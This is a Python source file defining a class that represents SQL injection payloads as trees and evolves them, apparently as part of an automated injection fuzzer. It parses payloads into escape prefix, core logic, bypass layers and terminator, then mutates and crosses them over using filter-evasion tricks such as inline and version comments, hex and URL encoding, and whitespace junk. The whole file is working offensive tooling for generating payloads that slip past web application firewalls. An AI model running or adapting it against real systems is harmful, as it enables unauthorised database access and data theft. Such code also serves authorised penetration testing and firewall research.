import random
import re
from core.grammar_engine import GrammarEngine

class PayloadGenome:
    """
    Represents a payload as a hierarchical 'Attack Tree' rather than static text.
    Root: Attack Type (UNION, ERROR, BLIND, etc.)
    Branches: Prefix, Core Logic, Bypass Techniques, Terminator.
    """
    def __init__(self, attack_type="GENERIC", prefix="", core="", bypasses=None, terminator="", parent_payload=None):
        self.attack_type = attack_type
        self.prefix = prefix
        self.core = core
        self.bypasses = bypasses or []  # List of bypass technique names/objects
        self.terminator = terminator
        self.parent_payload = parent_payload
        self.grammar = GrammarEngine()
        
    @classmethod
    def from_string(cls, payload_str):
        """Parses a string into a structured PayloadGenome tree."""
        # This is a heuristic parser to 'de-construct' existing payloads
        prefix_match = re.match(r"^(['\"]?\)?\)?\)?\)?\}?\]?)", payload_str)
        prefix = prefix_match.group(1) if prefix_match else ""
        
        # Strip terminators
        core_part = payload_str[len(prefix):]
        term_match = re.search(r"(--\s*-?|#|/\*|;%00).*$", core_part)
        terminator = term_match.group(0) if term_match else ""
        core = core_part[:len(core_part)-len(terminator)].strip()
        
        # Categorize Attack Type
        attack_type = "GENERIC"
        if "UNION" in core.upper(): attack_type = "UNION_BASED"
        elif "AND" in core.upper() or "OR" in core.upper(): attack_type = "LOGICAL_BLIND"
        elif "EXTRACTVALUE" in core.upper() or "UPDATEXML" in core.upper(): attack_type = "ERROR_BASED"
        elif "SLEEP" in core.upper() or "BENCHMARK" in core.upper(): attack_type = "TIME_BASED"
        
        # Identify existing bypasses (simple heuristic)
        bypasses = []
        if "/*" in core: bypasses.append("INLINE_COMMENTS")
        if "@@" in core: bypasses.append("SYS_VARS")
        if "%" in core: bypasses.append("URL_ENCODING")
        
        return cls(attack_type, prefix, core, bypasses, terminator)

    def render(self):
        """Reconstructs the payload string from the tree."""
        # Apply active bypasses to the core during rendering
        rendered_core = self.core
        
        # This is where the 'Bypass Layer' magic happens
        for tech in self.bypasses:
            rendered_core = self._apply_technique(rendered_core, tech)
            
        return f"{self.prefix}{rendered_core}{self.terminator}"

    def _apply_technique(self, text, tech):
        """Applies a specific bypass technique to the text."""
        if tech == "INLINE_COMMENTS":
            return text.replace(" ", "/**/")
        if tech == "VERSION_COMMENTS":
            return re.sub(r"\b(SELECT|UNION|FROM|WHERE|AND|OR|DATABASE|USER)\b", r"/*!50000\1*/", text, flags=re.IGNORECASE)
        if tech == "HEX_ENCODING":
            def to_hex(m):
                s = m.group(1)
                return "0x" + "".join([f"{ord(c):02x}" for c in s])
            return re.sub(r"'([^']*)'", to_hex, text)
        if tech == "URL_ENCODING":
            # Encode keywords and operators, avoid double encoding %
            return "".join([f"%{ord(c):02x}" if not c.isalnum() and c not in "()=,%" else c for c in text])
        if tech == "WHITESPACE_JUNK":
            junk = ["%0a", "%0d", "/**/", " ", "\t"]
            return text.replace(" ", random.choice(junk))
        if tech == "GRAMMAR_BNF":
            # Apply the BNF Custom Grammar Engine to expand components
            return self.grammar.obfuscate_query(text, intensity=2)
        return text

    def mutate(self, ast_mutator=None):
        """Applies a random mutation to the tree nodes."""
        choice = random.random()
        if choice < 0.4:
            # 1. Branch Mutation: Change Bypass Layer (Encoding/Obfuscation)
            techs = ["INLINE_COMMENTS", "VERSION_COMMENTS", "URL_ENCODING", "HEX_ENCODING", "WHITESPACE_JUNK", "GRAMMAR_BNF"]
            if random.random() < 0.7:
                new_tech = random.choice(techs)
                if new_tech not in self.bypasses:
                    self.bypasses.append(new_tech)
            else:
                if self.bypasses:
                    self.bypasses.remove(random.choice(self.bypasses))
        elif choice < 0.7 and ast_mutator:
            # 2. Leaf Mutation: Mutate the CORE logic using AST
            # We use wrap=False because PayloadGenome handles the wrapping
            self.core = ast_mutator.mutate(self.core, intensity=1, wrap=False)
        elif choice < 0.85:
            # 3. Strategy Mutation: Change Prefix (Escape Strategy)
            prefixes = ["'", "\"", "')", "\")", "'))", "1", "\\'"]
            self.prefix = random.choice(prefixes)
        else:
            # 4. Strategy Mutation: Change Terminator
            terminators = ["-- -", "#", ";%00", "/*", " --", ""]
            self.terminator = random.choice(terminators)

    @staticmethod
    def crossover(parent1, parent2):
        """
        Implements Crossover: Swapping Bypass Layers between two successful payloads.
        This creates a new hybrid that uses Parent 1's core logic with Parent 2's bypass strategy.
        """
        # Offspring 1: P1 Logic + P2 Bypasses
        child1 = PayloadGenome(
            attack_type=parent1.attack_type,
            prefix=parent1.prefix,
            core=parent1.core,
            bypasses=list(parent2.bypasses), # Hybridize: P2's bypasses
            terminator=parent1.terminator
        )
        # Offspring 2: P2 Logic + P1 Bypasses
        child2 = PayloadGenome(
            attack_type=parent2.attack_type,
            prefix=parent2.prefix,
            core=parent2.core,
            bypasses=list(parent1.bypasses), # Hybridize: P1's bypasses
            terminator=parent2.terminator
        )
        return child1, child2

    def to_dict(self):
        """Serializes the tree to a dictionary for JSON storage."""
        return {
            "attack_type": self.attack_type,
            "prefix": self.prefix,
            "core": self.core,
            "bypasses": self.bypasses,
            "terminator": self.terminator,
            "parent_payload": self.parent_payload
        }

    @classmethod
    def from_dict(cls, data):
        """Deserializes the tree from a dictionary."""
        return cls(
            attack_type=data.get("attack_type", "GENERIC"),
            prefix=data.get("prefix", ""),
            core=data.get("core", ""),
            bypasses=data.get("bypasses", []),
            terminator=data.get("terminator", ""),
            parent_payload=data.get("parent_payload")
        )
